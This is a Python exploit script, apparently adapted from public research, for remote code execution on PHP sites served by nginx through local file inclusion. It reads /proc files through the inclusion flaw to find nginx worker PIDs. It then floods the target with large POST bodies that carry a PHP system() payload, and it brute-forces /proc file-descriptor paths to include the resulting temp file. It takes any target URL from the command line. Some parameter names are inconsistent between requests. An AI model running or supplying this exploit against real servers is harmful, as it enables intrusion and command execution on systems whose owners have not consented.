#!/usr/bin/env python3
"""
PHP Local File Inclusion (LFI) exploit via nginx client body buffering assistance.

Based on research by:
- https://0xdf.gitlab.io/2023/09/09/htb-pikatwoo.html  
- https://bierbaumer.net/security/php-lfi-with-nginx-assistance/

This exploit leverages nginx's temporary file creation during large POST requests
to achieve code execution through LFI vulnerabilities... (beta edition)...
"""

import os
import sys
import re
import threading
import requests
import time
import logging
from typing import List, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('nginx_lfi_exploit.log')
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class ExploitConfig:
    """Configuration for the nginx LFI exploit"""
    target_url: str
    payload_marker: str = "0xdf0xdf"
    php_payload: str = '<?php system("id"); /*'
    payload_size: int = 16 * 1024  # Size of padding
    max_workers: int = 16
    max_fd_range: int = 32
    min_fd: int = 4
    request_timeout: int = 5
    max_retries: int = 3
    session_cookie: dict = None

    def __post_init__(self):
        if self.session_cookie is None:
            self.session_cookie = {"SESSa": "a"}

class NginxWorkerDiscovery:
    """Handles discovery of nginx worker processes"""
    
    def __init__(self, config: ExploitConfig):
        self.config = config
        self.session = self._create_session()
    
    def _create_session(self) -> requests.Session:
        """Create configured requests session"""
        session = requests.Session()
        session.timeout = self.config.request_timeout
        return session
    
    def get_system_info(self) -> tuple[int, int]:
        """
        Get system information (CPU count and PID max)
        Returns: (cpu_count, pid_max)
        """
        try:
            # Try to get CPU count from /proc/cpuinfo
            response = self.session.get(
                self.config.target_url,
                params={'file': '/proc/cpuinfo'},
                cookies=self.config.session_cookie
            )
            cpu_count = response.text.count('processor') or 2
            
            # Try to get PID max from /proc/sys/kernel/pid_max
            response = self.session.get(
                self.config.target_url,
                params={'file': '/proc/sys/kernel/pid_max'},
                cookies=self.config.session_cookie
            )
            try:
                pid_max = int(response.text.strip())
            except (ValueError, AttributeError):
                pid_max = 4194304  # Default fallback
            
            logger.info(f"System info - CPUs: {cpu_count}, PID max: {pid_max}")
            return cpu_count, pid_max
            
        except requests.RequestException as e:
            logger.warning(f"Failed to get system info: {e}")
            return 2, 4194304  # Safe defaults

    def find_nginx_workers(self, pid_max: int, cpu_count: int) -> List[int]:
        """
        Find nginx worker process PIDs
        Returns: List of nginx worker PIDs
        """
        nginx_workers = []
        logger.info(f"Searching for nginx workers (max PIDs to check: {pid_max})")
        
        # Use ThreadPoolExecutor for parallel PID checking
        with ThreadPoolExecutor(max_workers=10) as executor:
            # Submit PID check tasks in batches to avoid overwhelming the target
            batch_size = 100
            for batch_start in range(1, pid_max, batch_size):
                batch_end = min(batch_start + batch_size, pid_max)
                
                futures = {
                    executor.submit(self._check_pid, pid): pid 
                    for pid in range(batch_start, batch_end)
                }
                
                for future in as_completed(futures):
                    pid = futures[future]
                    try:
                        if future.result():
                            logger.info(f"Found nginx worker: {pid}")
                            nginx_workers.append(pid)
                            
                            # Stop when we have enough workers
                            if len(nginx_workers) >= cpu_count:
                                logger.info(f"Found {len(nginx_workers)} nginx workers")
                                return nginx_workers
                                
                    except Exception as e:
                        logger.debug(f"Error checking PID {pid}: {e}")
                
                # Small delay between batches to be less aggressive
                time.sleep(0.1)
        
        logger.info(f"Found {len(nginx_workers)} nginx workers total")
        return nginx_workers

    def _check_pid(self, pid: int) -> bool:
        """Check if PID is an nginx worker process"""
        try:
            response = self.session.post(
                self.config.target_url,
                data={'region': f'../../proc/{pid}/cmdline'},
                cookies=self.config.session_cookie,
                timeout=self.config.request_timeout
            )
            return b'nginx: worker process' in response.content
        except requests.RequestException:
            return False

class PayloadUploader:
    """Handles continuous payload upload to create nginx temp files"""
    
    def __init__(self, config: ExploitConfig):
        self.config = config
        self.session = self._create_session()
        self.running = False
    
    def _create_session(self) -> requests.Session:
        """Create configured requests session"""
        session = requests.Session()
        session.timeout = self.config.request_timeout
        return session
    
    def start_upload_threads(self, num_threads: int = None) -> List[threading.Thread]:
        """Start payload upload threads"""
        if num_threads is None:
            num_threads = self.config.max_workers
        
        self.running = True
        threads = []
        
        logger.info(f"Starting {num_threads} payload upload threads")
        for i in range(num_threads):
            thread = threading.Thread(target=self._upload_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        return threads
    
    def stop_upload_threads(self):
        """Stop all upload threads"""
        logger.info("Stopping payload upload threads")
        self.running = False
    
    def _upload_worker(self, worker_id: int):
        """Worker function for continuous payload upload"""
        logger.debug(f"Upload worker {worker_id} started")
        
        # Construct payload with marker and PHP code
        payload = (
            self.config.payload_marker + '\n' + 
            self.config.php_payload + 
            'A' * self.config.payload_size
        )
        
        while self.running:
            try:
                self.session.post(
                    self.config.target_url,
                    data=payload,
                    timeout=self.config.request_timeout
                )
            except requests.RequestException as e:
                logger.debug(f"Upload worker {worker_id} request failed: {e}")
                time.sleep(0.1)  # Brief pause on error

class FileDescriptorBruteForcer:
    """Handles brute forcing nginx file descriptors for LFI"""
    
    def __init__(self, config: ExploitConfig):
        self.config = config
        self.session = self._create_session()
        self.exploit_found = threading.Event()
    
    def _create_session(self) -> requests.Session:
        """Create configured requests session"""
        session = requests.Session()
        session.timeout = self.config.request_timeout
        return session
    
    def start_bruteforce(self, nginx_workers: List[int]) -> Optional[str]:
        """
        Start brute force attack on nginx workers
        Returns: Successful exploit response or None
        """
        if not nginx_workers:
            logger.error("No nginx workers found to bruteforce")
            return None
        
        logger.info(f"Starting bruteforce on {len(nginx_workers)} nginx workers")
        
        with ThreadPoolExecutor(max_workers=len(nginx_workers)) as executor:
            # Submit bruteforce task for each worker
            futures = {
                executor.submit(self._bruteforce_worker, pid): pid 
                for pid in nginx_workers
            }
            
            # Wait for first successful result
            for future in as_completed(futures):
                pid = futures[future]
                try:
                    result = future.result()
                    if result:
                        logger.info(f"Exploit successful via worker {pid}")
                        self.exploit_found.set()
                        return result
                except Exception as e:
                    logger.error(f"Error in bruteforce worker {pid}: {e}")
        
        logger.error("Bruteforce attack failed - no successful exploitation")
        return None
    
    def _bruteforce_worker(self, pid: int) -> Optional[str]:
        """Bruteforce file descriptors for a specific nginx worker"""
        logger.debug(f"Starting bruteforce for worker PID {pid}")
        
        retry_count = 0
        while not self.exploit_found.is_set() and retry_count < self.config.max_retries:
            retry_count += 1
            logger.debug(f"Bruteforce loop {retry_count} for PID {pid}")
            
            for fd in range(self.config.min_fd, self.config.max_fd_range):
                if self.exploit_found.is_set():
                    break
                
                # Construct file descriptor path
                fd_path = f'../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
                
                try:
                    response = self.session.post(
                        self.config.target_url,
                        data={'region': fd_path},
                        cookies=self.config.session_cookie,
                        timeout=self.config.request_timeout
                    )
                    
                    # Check if our payload marker is in the response
                    if response.text and self.config.payload_marker in response.text:
                        success_msg = f"SUCCESS! FD {fd_path}: {response.text[:200]}..."
                        logger.info(success_msg)
                        return response.text
                        
                except requests.RequestException as e:
                    logger.debug(f"Request failed for PID {pid}, FD {fd}: {e}")
            
            # Brief pause between retry cycles
            time.sleep(0.5)
        
        return None

class NginxLFIExploit:
    """Main exploit orchestrator"""
    
    def __init__(self, target_url: str, **kwargs):
        self.config = ExploitConfig(target_url=target_url, **kwargs)
        self.worker_discovery = NginxWorkerDiscovery(self.config)
        self.uploader = PayloadUploader(self.config)
        self.bruteforcer = FileDescriptorBruteForcer(self.config)
    
    def run_exploit(self) -> bool:
        """
        Run the complete nginx LFI exploit
        Returns: True if successful, False otherwise
        """
        try:
            logger.info(f"Starting nginx LFI exploit against {self.config.target_url}")
            
            # Step 1: Discover system information
            cpu_count, pid_max = self.worker_discovery.get_system_info()
            
            # Step 2: Find nginx worker processes
            nginx_workers = self.worker_discovery.find_nginx_workers(pid_max, cpu_count)
            if not nginx_workers:
                logger.error("No nginx workers found - exploit cannot continue")
                return False
            
            # Step 3: Start payload upload threads
            upload_threads = self.uploader.start_upload_threads()
            
            # Give upload threads time to start creating temp files
            logger.info("Waiting for payload upload threads to create temp files...")
            time.sleep(2)
            
            try:
                # Step 4: Start bruteforce attack
                result = self.bruteforcer.start_bruteforce(nginx_workers)
                
                if result:
                    logger.info("Exploit completed successfully!")
                    logger.info(f"Response: {result[:500]}...")
                    return True
                else:
                    logger.error("Exploit failed - no successful file descriptor found")
                    return False
                    
            finally:
                # Always stop upload threads
                self.uploader.stop_upload_threads()
                
        except KeyboardInterrupt:
            logger.info("Exploit interrupted by user")
            self.uploader.stop_upload_threads()
            return False
        except Exception as e:
            logger.error(f"Exploit failed with error: {e}")
            self.uploader.stop_upload_threads()
            return False

def main():
    """Main entry point"""
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://target.com/vulnerable.php")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Initialize and run exploit
    exploit = NginxLFIExploit(
        target_url=target_url,
        payload_marker="0xdf0xdf",
        php_payload='<?php system("whoami"); /*',
        max_workers=16
    )
    
    success = exploit.run_exploit()
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
